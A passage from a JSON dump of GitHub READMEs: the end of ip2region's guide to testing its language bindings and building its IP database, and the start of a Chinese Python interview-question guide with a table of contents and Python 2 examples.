\u6d4b\u8bd5\u7a0b\u5e8f\uff1a\r\nC#\u3001Node.js\u3001lua_c\u7684\u6d4b\u8bd5\u8bf7\u5177\u4f53\u53c2\u8003\u6587\u4ef6\u5939\u4e2dREADME.md \u8bf4\u660e\u3002\r\n\r\njava: \r\n```shell\r\ncd binding\/java\r\nant all\r\njava -jar ip2region-{version}.jar .\/data\/ip2region.db\r\n```\r\n\r\nphp: \r\n```shell\r\nphp binding\/php\/testSearcher.php .\/data\/ip2region.db\r\n```\r\n\r\nc: \r\n```shell\r\ncd binding\/c\/\r\ngcc -g -O2 testSearcher.c ip2region.c\r\n.\/a.out ..\/..\/data\/ip2region.db\r\n```\r\n\r\npython: \r\n```shell\r\npython binding\/python\/testSearcher.py .\/data\/ip2region.db\r\n```\r\n\r\nlua: \r\n```shell\r\ncd binding\/lua\/\r\nlua testSearcher.lua ..\/..\/data\/ip2region.db\r\n```\r\n\r\n\u5747\u4f1a\u770b\u5230\u5982\u4e0b\u754c\u9762\uff1a\r\n```shell\r\ninitializing  B-tree ... \r\n+----------------------------------+\r\n| ip2region test script            |\r\n| Author: chenxin619315@gmail.com  |\r\n| Type 'quit' to exit program      |\r\n+----------------------------------+\r\np2region>> 101.105.35.57\r\n2163|\u4e2d\u56fd|\u534e\u5357|\u5e7f\u4e1c\u7701|\u6df1\u5733\u5e02|\u9e4f\u535a\u58eb in 0.02295 millseconds\r\n```\r\n\r\n\u8f93\u5165ip\u5730\u5740\u5f00\u59cb\u6d4b\u8bd5\uff0c\u7b2c\u4e00\u6b21\u4f1a\u7a0d\u5fae\u6709\u70b9\u6162\uff0c\u5728\u8fd0\u884c\u547d\u4ee4\u540e\u9762\u63a5\u5165binary,memory\u6765\u5c1d\u8bd5\u5176\u4ed6\u7b97\u6cd5\uff0c\u5efa\u8bae\u4f7f\u7528b-tree\u7b97\u6cd5\uff0c\u901f\u5ea6\u548c\u5e76\u53d1\u9700\u6c42\u7684\u53ef\u4ee5\u4f7f\u7528memory\u7b97\u6cd5\u3002\r\n\r\n\u5177\u4f53\u96c6\u6210\u8bf7\u53c2\u8003\u4e0d\u540c\u5ba2\u6237\u7aef\u7684\u6d4b\u8bd5\u6e90\u7801\u3002\r\n\r\n\r\n### 7. \u5982\u4f55\u751f\u6210ip2region.db\u6587\u4ef6\r\n\r\n\u4ece1.8\u7248\u672c\u5f00\u59cb\uff0cip2region\u5f00\u6e90\u4e86ip2region.db\u751f\u6210\u7a0b\u5e8f\u7684java\u5b9e\u73b0\uff0c\u63d0\u4f9b\u4e86ant\u7f16\u8bd1\u652f\u6301\uff0c\u7f16\u8bd1\u540e\u4f1a\u5f97\u5230\u4ee5\u4e0b\u63d0\u5230\u7684dbMaker-{version}.jar\uff0c\u5bf9\u4e8e\u9700\u8981\u7814\u7a76\u751f\u6210\u7a0b\u5e8f\u7684\u6216\u8005\u66f4\u6539\u81ea\u5b9a\u4e49\u751f\u6210\u914d\u7f6e\u7684\u8bf7\u53c2\u8003${ip2region_root}\/maker\/java\u5185\u7684java\u6e90\u7801\u3002\r\n\r\n\r\n\u4eceip2region 1.2.2\u7248\u672c\u5f00\u59cb\u91cc\u9762\u63d0\u4ea4\u4e86\u4e00\u4e2adbMaker-{version}.jar\u7684\u53ef\u4ee5\u6267\u884cjar\u6587\u4ef6\uff0c\u7528\u5b83\u6765\u5b8c\u6210\u8fd9\u4e2a\u5de5\u4f5c\uff1a\r\n* 1, \u786e\u4fdd\u4f60\u5b89\u88c5\u597d\u4e86java\u73af\u5883\uff08\u4e0d\u73a9Java\u7684\u7ae5\u978b\u5c31\u81ea\u5df1\u8c37\u6b4c\u627e\u627e\u62c9\uff0c\u4e34\u65f6\u7528\u4e00\u7528\uff0c\u51e0\u5206\u949f\u7684\u4e8b\u60c5\uff09\r\n* 2, cd\u5230${ip2region_root}\/maker\/java\uff0c\u7136\u540e\u8fd0\u884c\u5982\u4e0b\u547d\u4ee4\uff1a\r\n\r\n```shell\r\njava -jar dbMaker-{version}.jar -src \u6587\u672c\u6570\u636e\u6587\u4ef6 -region \u5730\u57dfcsv\u6587\u4ef6 [-dst \u751f\u6210\u7684ip2region.db\u6587\u4ef6\u7684\u76ee\u5f55]\r\n\r\n# \u6587\u672c\u6570\u636e\u6587\u4ef6\uff1adb\u6587\u4ef6\u7684\u539f\u59cb\u6587\u672c\u6570\u636e\u6587\u4ef6\u8def\u5f84\uff0c\u81ea\u5e26\u7684ip2region.db\u6587\u4ef6\u5c31\u662f\/data\/ip.merge.txt\u751f\u6210\u800c\u6765\u7684\uff0c\u4f60\u53ef\u4ee5\u6362\u6210\u81ea\u5df1\u7684\u6216\u8005\u66f4\u6539\/data\/ip.merge.txt\u91cd\u65b0\u751f\u6210\r\n# \u5730\u57dfcsv\u6587\u4ef6\uff1a\u8be5\u6587\u4ef6\u76ee\u7684\u662f\u65b9\u4fbf\u914d\u7f6eip2region\u8fdb\u884c\u6570\u636e\u5173\u7cfb\u7684\u5b58\u50a8\uff0c\u5f97\u5230\u7684\u6570\u636e\u5305\u542b\u4e00\u4e2acity_id\uff0c\u8fd9\u4e2a\u76f4\u63a5\u4f7f\u7528\/data\/origin\/global_region.csv\u6587\u4ef6\u5373\u53ef\r\n# ip2region.db\u6587\u4ef6\u7684\u76ee\u5f55\uff1a\u662f\u53ef\u9009\u53c2\u6570\uff0c\u6ca1\u6709\u6307\u5b9a\u7684\u8bdd\u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u751f\u6210\u4e00\u4efd.\/data\/ip2region.db\u6587\u4ef6\r\n```\r\n\r\n* 3, \u83b7\u53d6\u751f\u6210\u7684ip2region.db\u6587\u4ef6\u8986\u76d6\u539f\u6765\u7684ip2region.db\u6587\u4ef6\u5373\u53ef\r\n* 4, \u9ed8\u8ba4\u7684ip2region.db\u6587\u4ef6\u751f\u6210\u547d\u4ee4:\r\n\r\n```shell\r\ncd ${ip2region_root}\/java\/\r\njava -jar dbMaker-1.2.2.jar -src .\/data\/ip.merge.txt -region .\/data\/global_region.csv\r\n\r\n# \u4f1a\u770b\u5230\u4e00\u5927\u7247\u7684\u8f93\u51fa\r\n```\r\n\r\n* 5, \u6570\u636e\u5e93\u6587\u4ef6\u7684\u7ed3\u6784\u548c\u539f\u7406\u8bf7\u9605\u8bfb @\u51ac\u82bd \u7684blog\uff1a[\u201cip2region\u6570\u636e\u5e93\u6587\u4ef6\u7684\u7ed3\u6784\u548c\u539f\u7406\u201d](http:\/\/dongyado.com\/tool\/2016\/08\/18\/structure-of-ip2region-database-file\/)\r\n\r\n\r\n### 8. \u5176\u4ed6\u5907\u6ce8\r\n* 1, \u5168\u90e8binding\u7684\u5404\u4e2asearch\u63a5\u53e3\u90fd<b>\u4e0d\u662f<\/b>\u7ebf\u7a0b\u5b89\u5168\u7684\u5b9e\u73b0\uff0c\u4e0d\u540c\u7ebf\u7a0b\u53ef\u4ee5\u901a\u8fc7\u521b\u5efa\u4e0d\u540c\u7684\u67e5\u8be2\u5bf9\u8c61\u6765\u4f7f\u7528\u3002\r\n* 2, memorySearch\u63a5\u53e3\uff0c\u5728\u53d1\u5e03\u5bf9\u8c61\u524d\u8fdb\u884c\u4e00\u6b21\u9884\u67e5\u8be2\uff0c\u53ef\u4ee5\u5b89\u5168\u7528\u4e8e\u591a\u7ebf\u7a0b\u73af\u5883\u3002\r\n* 3, ip2region\u4ea4\u6d41\u5206\u4eab\uff0c\u5fae\u4fe1\uff1alionsoul2014\uff0cQQ\uff1a1187582057\r\n"},{"repo":"\/taizilongxu\/interview_python","language":"Shell","readme_contents":"<!-- markdown-toc start - Don't edit this section. Run M-x markdown-toc-generate-toc again -->\n**Table of Contents**\n\n\n   * [Python\u8bed\u8a00\u7279\u6027](#python\u8bed\u8a00\u7279\u6027)\n      * [1 Python\u7684\u51fd\u6570\u53c2\u6570\u4f20\u9012](#1-python\u7684\u51fd\u6570\u53c2\u6570\u4f20\u9012)\n      * [2 Python\u4e2d\u7684\u5143\u7c7b(metaclass)](#2-python\u4e2d\u7684\u5143\u7c7bmetaclass)\n      * [3 @staticmethod\u548c@classmethod](#3-staticmethod\u548cclassmethod)\n      * [4 \u7c7b\u53d8\u91cf\u548c\u5b9e\u4f8b\u53d8\u91cf](#4-\u7c7b\u53d8\u91cf\u548c\u5b9e\u4f8b\u53d8\u91cf)\n      * [5 Python\u81ea\u7701](#5-python\u81ea\u7701)\n      * [6 \u5b57\u5178\u63a8\u5bfc\u5f0f](#6-\u5b57\u5178\u63a8\u5bfc\u5f0f)\n      * [7 Python\u4e2d\u5355\u4e0b\u5212\u7ebf\u548c\u53cc\u4e0b\u5212\u7ebf](#7-python\u4e2d\u5355\u4e0b\u5212\u7ebf\u548c\u53cc\u4e0b\u5212\u7ebf)\n      * [8 \u5b57\u7b26\u4e32\u683c\u5f0f\u5316:\\x\u548c.format](#8-\u5b57\u7b26\u4e32\u683c\u5f0f\u5316\u548cformat)\n      * [9 \u8fed\u4ee3\u5668\u548c\u751f\u6210\u5668](#9-\u8fed\u4ee3\u5668\u548c\u751f\u6210\u5668)\n      * [10 *args and <code>**kwargs<\/code>](#10-args-and-kwargs)\n      * [11 \u9762\u5411\u5207\u9762\u7f16\u7a0bAOP\u548c\u88c5\u9970\u5668](#11-\u9762\u5411\u5207\u9762\u7f16\u7a0baop\u548c\u88c5\u9970\u5668)\n      * [12 \u9e2d\u5b50\u7c7b\u578b](#12-\u9e2d\u5b50\u7c7b\u578b)\n      * [13 Python\u4e2d\u91cd\u8f7d](#13-python\u4e2d\u91cd\u8f7d)\n      * [14 \u65b0\u5f0f\u7c7b\u548c\u65e7\u5f0f\u7c7b](#14-\u65b0\u5f0f\u7c7b\u548c\u65e7\u5f0f\u7c7b)\n      * [15 __new__\u548c<code>__init__<\/code>\u7684\u533a\u522b](#15-__new__\u548c__init__\u7684\u533a\u522b)\n      * [16 \u5355\u4f8b\u6a21\u5f0f](#16-\u5355\u4f8b\u6a21\u5f0f)\n         * [1 \u4f7f\u7528__new__\u65b9\u6cd5](#1-\u4f7f\u7528__new__\u65b9\u6cd5)\n         * [2 \u5171\u4eab\u5c5e\u6027](#2-\u5171\u4eab\u5c5e\u6027)\n         * [3 \u88c5\u9970\u5668\u7248\u672c](#3-\u88c5\u9970\u5668\u7248\u672c)\n         * [4 import\u65b9\u6cd5](#4-import\u65b9\u6cd5)\n      * [17 Python\u4e2d\u7684\u4f5c\u7528\u57df](#17-python\u4e2d\u7684\u4f5c\u7528\u57df)\n      * [18 GIL\u7ebf\u7a0b\u5168\u5c40\u9501](#18-gil\u7ebf\u7a0b\u5168\u5c40\u9501)\n      * [19 \u534f\u7a0b](#19-\u534f\u7a0b)\n      * [20 \u95ed\u5305](#20-\u95ed\u5305)\n      * [21 lambda\u51fd\u6570](#21-lambda\u51fd\u6570)\n      * [22 Python\u51fd\u6570\u5f0f\u7f16\u7a0b](#22-python\u51fd\u6570\u5f0f\u7f16\u7a0b)\n      * [23 Python\u91cc\u7684\u62f7\u8d1d](#23-python\u91cc\u7684\u62f7\u8d1d)\n      * [24 Python\u5783\u573e\u56de\u6536\u673a\u5236](#24-python\u5783\u573e\u56de\u6536\u673a\u5236)\n         * [1 \u5f15\u7528\u8ba1\u6570](#1-\u5f15\u7528\u8ba1\u6570)\n         * [2 \u6807\u8bb0-\u6e05\u9664\u673a\u5236](#2-\u6807\u8bb0-\u6e05\u9664\u673a\u5236)\n         * [3 \u5206\u4ee3\u6280\u672f](#3-\u5206\u4ee3\u6280\u672f)\n      * [25 Python\u7684List](#25-python\u7684list)\n      * [26 Python\u7684is](#26-python\u7684is)\n      * [27 read,readline\u548creadlines](#27-readreadline\u548creadlines)\n      * [28 Python2\u548c3\u7684\u533a\u522b](#28-python2\u548c3\u7684\u533a\u522b)\n      * [29 super init](#29-super-init)\n      * [30 range and xrange](#30-range-and-xrange)\n   * [\u64cd\u4f5c\u7cfb\u7edf](#\u64cd\u4f5c\u7cfb\u7edf)\n      * [1 select,poll\u548cepoll](#1-selectpoll\u548cepoll)\n      * [2 \u8c03\u5ea6\u7b97\u6cd5](#2-\u8c03\u5ea6\u7b97\u6cd5)\n      * [3 \u6b7b\u9501](#3-\u6b7b\u9501)\n      * [4 \u7a0b\u5e8f\u7f16\u8bd1\u4e0e\u94fe\u63a5](#4-\u7a0b\u5e8f\u7f16\u8bd1\u4e0e\u94fe\u63a5)\n         * [1 \u9884\u5904\u7406](#1-\u9884\u5904\u7406)\n         * [2 \u7f16\u8bd1](#2-\u7f16\u8bd1)\n         * [3 \u6c47\u7f16](#3-\u6c47\u7f16)\n         * [4 \u94fe\u63a5](#4-\u94fe\u63a5)\n      * [5 \u9759\u6001\u94fe\u63a5\u548c\u52a8\u6001\u94fe\u63a5](#5-\u9759\u6001\u94fe\u63a5\u548c\u52a8\u6001\u94fe\u63a5)\n      * [6 \u865a\u62df\u5185\u5b58\u6280\u672f](#6-\u865a\u62df\u5185\u5b58\u6280\u672f)\n      * [7 \u5206\u9875\u548c\u5206\u6bb5](#7-\u5206\u9875\u548c\u5206\u6bb5)\n         * [\u5206\u9875\u4e0e\u5206\u6bb5\u7684\u4e3b\u8981\u533a\u522b](#\u5206\u9875\u4e0e\u5206\u6bb5\u7684\u4e3b\u8981\u533a\u522b)\n      * [8 \u9875\u9762\u7f6e\u6362\u7b97\u6cd5](#8-\u9875\u9762\u7f6e\u6362\u7b97\u6cd5)\n      * [9 \u8fb9\u6cbf\u89e6\u53d1\u548c\u6c34\u5e73\u89e6\u53d1](#9-\u8fb9\u6cbf\u89e6\u53d1\u548c\u6c34\u5e73\u89e6\u53d1)\n   * [\u6570\u636e\u5e93](#\u6570\u636e\u5e93)\n      * [1 \u4e8b\u52a1](#1-\u4e8b\u52a1)\n      * [2 \u6570\u636e\u5e93\u7d22\u5f15](#2-\u6570\u636e\u5e93\u7d22\u5f15)\n      * [3 Redis\u539f\u7406](#3-redis\u539f\u7406)\n         * [Redis\u662f\u4ec0\u4e48\uff1f](#redis\u662f\u4ec0\u4e48)\n         * [Redis\u6570\u636e\u5e93](#redis\u6570\u636e\u5e93)\n         * [Redis\u7f3a\u70b9](#redis\u7f3a\u70b9)\n      * [4 \u4e50\u89c2\u9501\u548c\u60b2\u89c2\u9501](#4-\u4e50\u89c2\u9501\u548c\u60b2\u89c2\u9501)\n      * [5 MVCC](#5-mvcc)\n         * [<a href=\"http:\/\/lib.csdn.net\/base\/mysql\">MySQL<\/a>\u7684innodb\u5f15\u64ce\u662f\u5982\u4f55\u5b9e\u73b0MVCC\u7684](#mysql\u7684innodb\u5f15\u64ce\u662f\u5982\u4f55\u5b9e\u73b0mvcc\u7684)\n      * [6 MyISAM\u548cInnoDB](#6-myisam\u548cinnodb)\n   * [\u7f51\u7edc](#\u7f51\u7edc)\n      * [1 \u4e09\u6b21\u63e1\u624b](#1-\u4e09\u6b21\u63e1\u624b)\n      * [2 \u56db\u6b21\u6325\u624b](#2-\u56db\u6b21\u6325\u624b)\n      * [3 ARP\u534f\u8bae](#3-arp\u534f\u8bae)\n      * [4 urllib\u548curllib2\u7684\u533a\u522b](#4-urllib\u548curllib2\u7684\u533a\u522b)\n      * [5 Post\u548cGet](#5-post\u548cget)\n      * [6 Cookie\u548cSession](#6-cookie\u548csession)\n      * [7 apache\u548cnginx\u7684\u533a\u522b](#7-apache\u548cnginx\u7684\u533a\u522b)\n      * [8 \u7f51\u7ad9\u7528\u6237\u5bc6\u7801\u4fdd\u5b58](#8-\u7f51\u7ad9\u7528\u6237\u5bc6\u7801\u4fdd\u5b58)\n      * [9 HTTP\u548cHTTPS](#9-http\u548chttps)\n      * [10 XSRF\u548cXSS](#10-xsrf\u548cxss)\n      * [11 \u5e42\u7b49 Idempotence](#11-\u5e42\u7b49-idempotence)\n      * [12 RESTful\u67b6\u6784(SOAP,RPC)](#12-restful\u67b6\u6784soaprpc)\n      * [13 SOAP](#13-soap)\n      * [14 RPC](#14-rpc)\n      * [15 CGI\u548cWSGI](#15-cgi\u548cwsgi)\n      * [16 \u4e2d\u95f4\u4eba\u653b\u51fb](#16-\u4e2d\u95f4\u4eba\u653b\u51fb)\n      * [17 c10k\u95ee\u9898](#17-c10k\u95ee\u9898)\n      * [18 socket](#18-socket)\n      * [19 \u6d4f\u89c8\u5668\u7f13\u5b58](#19-\u6d4f\u89c8\u5668\u7f13\u5b58)\n      * [20 HTTP1.0\u548cHTTP1.1](#20-http10\u548chttp11)\n      * [21 Ajax](#21-ajax)\n   * [*NIX](#nix)\n      * [unix\u8fdb\u7a0b\u95f4\u901a\u4fe1\u65b9\u5f0f(IPC)](#unix\u8fdb\u7a0b\u95f4\u901a\u4fe1\u65b9\u5f0fipc)\n   * [\u6570\u636e\u7ed3\u6784](#\u6570\u636e\u7ed3\u6784)\n      * [1 \u7ea2\u9ed1\u6811](#1-\u7ea2\u9ed1\u6811)\n   * [\u7f16\u7a0b\u9898](#\u7f16\u7a0b\u9898)\n      * [1 \u53f0\u9636\u95ee\u9898\/\u6590\u6ce2\u90a3\u5951](#1-\u53f0\u9636\u95ee\u9898\u6590\u6ce2\u90a3\u5951)\n      * [2 \u53d8\u6001\u53f0\u9636\u95ee\u9898](#2-\u53d8\u6001\u53f0\u9636\u95ee\u9898)\n      * [3 \u77e9\u5f62\u8986\u76d6](#3-\u77e9\u5f62\u8986\u76d6)\n      * [4 \u6768\u6c0f\u77e9\u9635\u67e5\u627e](#4-\u6768\u6c0f\u77e9\u9635\u67e5\u627e)\n      * [5 \u53bb\u9664\u5217\u8868\u4e2d\u7684\u91cd\u590d\u5143\u7d20](#5-\u53bb\u9664\u5217\u8868\u4e2d\u7684\u91cd\u590d\u5143\u7d20)\n      * [6 \u94fe\u8868\u6210\u5bf9\u8c03\u6362](#6-\u94fe\u8868\u6210\u5bf9\u8c03\u6362)\n      * [7 \u521b\u5efa\u5b57\u5178\u7684\u65b9\u6cd5](#7-\u521b\u5efa\u5b57\u5178\u7684\u65b9\u6cd5)\n         * [1 \u76f4\u63a5\u521b\u5efa](#1-\u76f4\u63a5\u521b\u5efa)\n         * [2 \u5de5\u5382\u65b9\u6cd5](#2-\u5de5\u5382\u65b9\u6cd5)\n         * [3 fromkeys()\u65b9\u6cd5](#3-fromkeys\u65b9\u6cd5)\n      * [8 \u5408\u5e76\u4e24\u4e2a\u6709\u5e8f\u5217\u8868](#8-\u5408\u5e76\u4e24\u4e2a\u6709\u5e8f\u5217\u8868)\n      * [9 \u4ea4\u53c9\u94fe\u8868\u6c42\u4ea4\u70b9](#9-\u4ea4\u53c9\u94fe\u8868\u6c42\u4ea4\u70b9)\n      * [10 \u4e8c\u5206\u67e5\u627e](#10-\u4e8c\u5206\u67e5\u627e)\n      * [11 \u5feb\u6392](#11-\u5feb\u6392)\n      * [12 \u627e\u96f6\u95ee\u9898](#12-\u627e\u96f6\u95ee\u9898)\n      * [13 \u5e7f\u5ea6\u904d\u5386\u548c\u6df1\u5ea6\u904d\u5386\u4e8c\u53c9\u6811](#13-\u5e7f\u5ea6\u904d\u5386\u548c\u6df1\u5ea6\u904d\u5386\u4e8c\u53c9\u6811)\n      * [17 \u524d\u4e2d\u540e\u5e8f\u904d\u5386](#17-\u524d\u4e2d\u540e\u5e8f\u904d\u5386)\n      * [18 \u6c42\u6700\u5927\u6811\u6df1](#18-\u6c42\u6700\u5927\u6811\u6df1)\n      * [19 \u6c42\u4e24\u68f5\u6811\u662f\u5426\u76f8\u540c](#19-\u6c42\u4e24\u68f5\u6811\u662f\u5426\u76f8\u540c)\n      * [20 \u524d\u5e8f\u4e2d\u5e8f\u6c42\u540e\u5e8f](#20-\u524d\u5e8f\u4e2d\u5e8f\u6c42\u540e\u5e8f)\n      * [21 \u5355\u94fe\u8868\u9006\u7f6e](#21-\u5355\u94fe\u8868\u9006\u7f6e)\n      * [22 \u4e24\u4e2a\u5b57\u7b26\u4e32\u662f\u5426\u662f\u53d8\u4f4d\u8bcd](#22-\u4e24\u4e2a\u5b57\u7b26\u4e32\u662f\u5426\u662f\u53d8\u4f4d\u8bcd)\n      * [23 \u52a8\u6001\u89c4\u5212\u95ee\u9898](#23-\u52a8\u6001\u89c4\u5212\u95ee\u9898)\n\n<!-- markdown-toc end -->\n\n\n\n\n\n# Python\u8bed\u8a00\u7279\u6027\n\n## 1 Python\u7684\u51fd\u6570\u53c2\u6570\u4f20\u9012\n\n\u770b\u4e24\u4e2a\u4f8b\u5b50:\n\n```python\na = 1\ndef fun(a):\n    a = 2\nfun(a)\nprint a  # 1\n```\n\n```python\na = []\ndef fun(a):\n    a.append(1)\nfun(a)\nprint a  # [1]\n```\n\n\u6240\u6709\u7684\u53d8\u91cf\u90fd\u53ef\u4ee5\u7406\u89e3\u662f\u5185\u5b58\u4e2d\u4e00\u4e2a\u5bf9\u8c61\u7684\u201c\u5f15\u7528\u201d\uff0c\u6216\u8005\uff0c\u4e5f\u53ef\u4ee5\u770b\u4f3cc\u4e2dvoid*\u7684\u611f\u89c9\u3002\n\n\u901a\u8fc7`id`\u6765\u770b\u5f15\u7528`a`\u7684\u5185\u5b58\u5730\u5740\u53ef\u4ee5\u6bd4\u8f83\u7406\u89e3\uff1a\n\n```python\na = 1\ndef fun(a):\n    print \"func_in\",id(a)   # func_in 41322472\n    a = 2\n    print \"re-point\",id(a), id(2)   # re-point 41322448 41322448\nprint \"func_out\",id(a), id(1)  # func_out 41322472 41322472\nfun(a)\nprint a  # 1\n```\n\n\u6ce8\uff1a\u5177\u4f53\u7684\u503c\u5728\u4e0d\u540c\u7535\u8111\u4e0a\u8fd0\u884c\u65f6\u53ef\u80fd\u4e0d\u540c\u3002\n\n\u53ef\u4ee5\u770b\u5230\uff0c\u5728\u6267\u884c\u5b8c`a = 2`\u4e4b\u540e\uff0c`a`\u5f15\u7528\u4e2d\u4fdd\u5b58\u7684\u503c\uff0c\u5373\u5185\u5b58\u5730\u5740\u53d1\u751f\u53d8\u5316\uff0c\u7531\u539f\u6765`1`\u5bf9\u8c61\u7684\u6240\u5728\u7684\u5730\u5740\u53d8\u6210\u4e86`2`\u8fd9\u4e2a\u5b9e\u4f53\u5bf9\u8c61\u7684\u5185\u5b58\u5730\u5740\u3002\n\n\u800c\u7b2c2\u4e2a\u4f8b\u5b50`a`\u5f15\u7528\u4fdd\u5b58\u7684\u5185\u5b58\u503c\u5c31\u4e0d\u4f1a\u53d1\u751f\u53d8\u5316\uff1a\n\n```python\na = []\ndef fun(a):\n    print \"func_in\",id(a)  # func_in 53629256\n    a.append(1)\nprint \"func_out\",id(a)     # func_out 53629256\nfun(a)\nprint a  # [1]\n```\n\n\u8fd9\u91cc\u8bb0\u4f4f\u7684\u662f\u7c7b\u578b\u662f\u5c5e\u4e8e\u5bf9\u8c61\u7684\uff0c\u800c\u4e0d\u662f\u53d8\u91cf\u3002\u800c\u5bf9\u8c61\u6709\u4e24\u79cd,\u201c\u53ef\u66f4\u6539\u201d\uff08mutable\uff09\u4e0e\u201c\u4e0d\u53ef\u66f4\u6539\u201d\uff08immutable\uff09\u5bf9\u8c61\u3002\u5728python\u4e2d\uff0cstrings, tuples, \u548cnumbers\u662f\u4e0d\u53ef\u66f4\u6539\u7684\u5bf9\u8c61\uff0c\u800c list, dict, set \u7b49\u5219\u662f\u53ef\u4ee5\u4fee\u6539\u7684\u5bf9\u8c61\u3002(\u8fd9\u5c31\u662f\u8fd9\u4e2a\u95ee\u9898\u7684\u91cd\u70b9)\n\n\u5f53\u4e00\u4e2a\u5f15\u7528\u4f20\u9012\u7ed9\u51fd\u6570\u7684\u65f6\u5019,\u51fd\u6570\u81ea\u52a8\u590d\u5236\u4e00\u4efd\u5f15\u7528,\u8fd9\u4e2a\u51fd\u6570\u91cc\u7684\u5f15\u7528\u548c\u5916\u8fb9\u7684\u5f15\u7528\u6ca1\u6709\u534a\u6bdb\u5173\u7cfb\u4e86.\u6240\u4ee5\u7b2c\u4e00\u4e2a\u4f8b\u5b50\u91cc\u51fd\u6570\u628a\u5f15\u7528\u6307\u5411\u4e86\u4e00\u4e2a\u4e0d\u53ef\u53d8\u5bf9\u8c61,\u5f53\u51fd\u6570\u8fd4\u56de\u7684\u65f6\u5019,\u5916\u9762\u7684\u5f15\u7528\u6ca1\u534a\u6bdb\u611f\u89c9.\u800c\u7b2c\u4e8c\u4e2a\u4f8b\u5b50\u5c31\u4e0d\u4e00\u6837\u4e86,\u51fd\u6570\u5185\u7684\u5f15\u7528\u6307\u5411\u7684\u662f\u53ef\u53d8\u5bf9\u8c61,\u5bf9\u5b83\u7684\u64cd\u4f5c\u5c31\u548c\u5b9a\u4f4d\u4e86\u6307\u9488\u5730\u5740\u4e00\u6837,\u5728\u5185\u5b58\u91cc\u8fdb\u884c\u4fee\u6539.\n\n\u5982\u679c\u8fd8\u4e0d\u660e\u767d\u7684\u8bdd,\u8fd9\u91cc\u6709\u66f4\u597d\u7684\u89e3\u91ca: http:\/\/stackoverflow.com\/questions\/986006\/how-do-i-pass-a-variable-by-reference\n\n## 2 Python\u4e2d\u7684\u5143\u7c7b(metaclass)\n\n\u8fd9\u4e2a\u975e\u5e38\u7684\u4e0d\u5e38\u7528,\u4f46\u662f\u50cfORM\u8fd9\u79cd\u590d\u6742\u7684\u7ed3\u6784\u8fd8\u662f\u4f1a\u9700\u8981\u7684,\u8be6\u60c5\u8bf7\u770b:http:\/\/stackoverflow.com\/questions\/100003\/what-is-a-metaclass-in-python\n\n## 3 @staticmethod\u548c@classmethod\n\nPython\u5176\u5b9e\u67093\u4e2a\u65b9\u6cd5,\u5373\u9759\u6001\u65b9\u6cd5(staticmethod),\u7c7b\u65b9\u6cd5(classmethod)\u548c\u5b9e\u4f8b\u65b9\u6cd5,\u5982\u4e0b:\n\n```python\ndef foo(x):\n    print \"executing foo(%s)\"%(x)\n\nclass A(object):\n    def foo(self,x):\n        print \"executing foo(%s,%s)\"%(self,x)\n\n    @classmethod\n    def class_foo(cls,x):\n        print \"executing class_foo(%s,%s)\"%(cls,x)\n\n    @staticmethod\n    def static_foo(x):\n        print \"executing static_foo(%s)\"%x\n\na=A()\n\n```\n\n\u8fd9\u91cc\u5148\u7406\u89e3\u4e0b\u51fd\u6570\u53c2\u6570\u91cc\u9762\u7684self\u548ccls.\u8fd9\u4e2aself\u548ccls\u662f\u5bf9\u7c7b\u6216\u8005\u5b9e\u4f8b\u7684\u7ed1\u5b9a,\u5bf9\u4e8e\u4e00\u822c\u7684\u51fd\u6570\u6765\u8bf4\u6211\u4eec\u53ef\u4ee5\u8fd9\u4e48\u8c03\u7528`foo(x)`,\u8fd9\u4e2a\u51fd\u6570\u5c31\u662f\u6700\u5e38\u7528\u7684,\u5b83\u7684\u5de5\u4f5c\u8ddf\u4efb\u4f55\u4e1c\u897f(\u7c7b,\u5b9e\u4f8b)\u65e0\u5173.\u5bf9\u4e8e\u5b9e\u4f8b\u65b9\u6cd5,\u6211\u4eec\u77e5\u9053\u5728\u7c7b\u91cc\u6bcf\u6b21\u5b9a\u4e49\u65b9\u6cd5\u7684\u65f6\u5019\u90fd\u9700\u8981\u7ed1\u5b9a\u8fd9\u4e2a\u5b9e\u4f8b,\u5c31\u662f`foo(self, x)`,\u4e3a\u4ec0\u4e48\u8981\u8fd9\u4e48\u505a\u5462?\u56e0\u4e3a\u5b9e\u4f8b\u65b9\u6cd5\u7684\u8c03\u7528\u79bb\u4e0d\u5f00\u5b9e\u4f8b,\u6211\u4eec\u9700\u8981\u628a\u5b9e\u4f8b\u81ea\u5df1\u4f20\u7ed9\u51fd\u6570,\u8c03\u7528\u7684\u65f6\u5019\u662f\u8fd9\u6837\u7684`a.foo(x)`(\u5176\u5b9e\u662f`foo(a, x)`).\u7c7b\u65b9\u6cd5\u4e00\u6837,\u53ea\u4e0d\u8fc7\u5b83\u4f20\u9012\u7684\u662f\u7c7b\u800c\u4e0d\u662f\u5b9e\u4f8b,`A.class_foo(x)`.\u6ce8\u610f\u8fd9\u91cc\u7684self\u548ccls\u53ef\u4ee5\u66ff\u6362\u522b\u7684\u53c2\u6570,\u4f46\u662fpython\u7684\u7ea6\u5b9a\u662f\u8fd9\u4fe9,\u8fd8\u662f\u4e0d\u8981\u6539\u7684\u597d.\n\n\u5bf9\u4e8e\u9759\u6001\u65b9\u6cd5\u5176\u5b9e\u548c\u666e\u901a\u7684\u65b9\u6cd5\u4e00\u6837,\u4e0d\u9700\u8981\u5bf9\u8c01\u8fdb\u884c\u7ed1\u5b9a,\u552f\u4e00\u7684\u533a\u522b\u662f\u8c03\u7528\u7684\u65f6\u5019\u9700\u8981\u4f7f\u7528`a.static_foo(x)`\u6216\u8005`A.static_foo(x)`\u6765\u8c03\u7528.\n\n| \\\\      | \u5b9e\u4f8b\u65b9\u6cd5     | \u7c7b\u65b9\u6cd5            | \u9759\u6001\u65b9\u6cd5            |\n| :------ | :------- | :------------- | :-------------- |\n| a = A() | a.foo(x) | a.class_foo(x) | a.static_foo(x) |\n| A       | \u4e0d\u53ef\u7528      | A.class_foo(x) | A.static_foo(x) |\n\n\u66f4\u591a\u5173\u4e8e\u8fd9\u4e2a\u95ee\u9898:\n1. http:\/\/stackoverflow.com\/questions\/136097\/what-is-the-difference-between-staticmethod-and-classmethod-in-python\n2. https:\/\/realpython.com\/blog\/python\/instance-class-and-static-methods-demystified\/\n## 4 \u7c7b\u53d8\u91cf\u548c\u5b9e\u4f8b\u53d8\u91cf\n\n**\u7c7b\u53d8\u91cf\uff1a**\n\n> 